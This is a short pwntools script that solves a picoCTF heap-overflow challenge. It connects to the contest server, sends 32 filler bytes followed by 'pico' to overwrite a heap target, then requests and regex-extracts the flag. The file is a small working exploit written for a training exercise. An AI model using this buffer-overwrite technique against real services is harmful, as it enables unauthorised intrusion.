from pwn import *
import re

remote = remote(host='tethys.picoctf.net', port=57044)
# ignore first prompt
val = remote.recv()
print(val)
# choose to write to buffer
payload = '2\n'
remote.sendline(payload.encode())
#   append 32 bytes to payload to
#   get to target address
payload = "1"*32
payload += "pico\n"
remote.sendline(payload.encode())
# Successfully overwritten heap target, print flag
payload = "4\n"
remote.sendline(payload.encode())
# Get server input
sol = remote.recvall()
# Use regex to match the flag
flag = re.search(pattern=r"picoCTF{[^}]*}" , string=sol.decode())
if flag:
    flag = flag.group(0)
    print("Found flag:")
    print(flag)
else:
    print(f"No flag found in {sol.decode()}")